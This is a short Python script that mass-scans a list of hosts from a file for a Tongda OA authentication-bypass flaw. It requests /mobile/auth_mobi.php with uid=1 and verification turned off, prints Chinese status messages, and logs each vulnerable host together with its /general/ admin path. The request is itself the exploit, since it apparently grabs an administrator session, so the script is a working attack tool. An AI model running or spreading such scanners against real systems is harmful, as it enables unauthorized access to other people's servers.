import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"
}

for url in open("oa.txt"):
    try:
        url = url.replace("\n", "")
        url1=url+"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
        print(url)
        print("检测中----\n\n")
        response = requests.get(url1,headers=headers,verify=False,timeout=5)
        print(response.text)
        if "RELOGIN" in response.text:
            print("不存在漏洞!")
        elif response.status_code ==200:
            print("存在漏洞!")
            with open("tongdaoa_vul.txt", "a+") as f:
                             f.write(url1 + "\n")
                             f.write(url+"/general/"+"\n"+"\n")
    except:
        print("出现异常!")
        pass
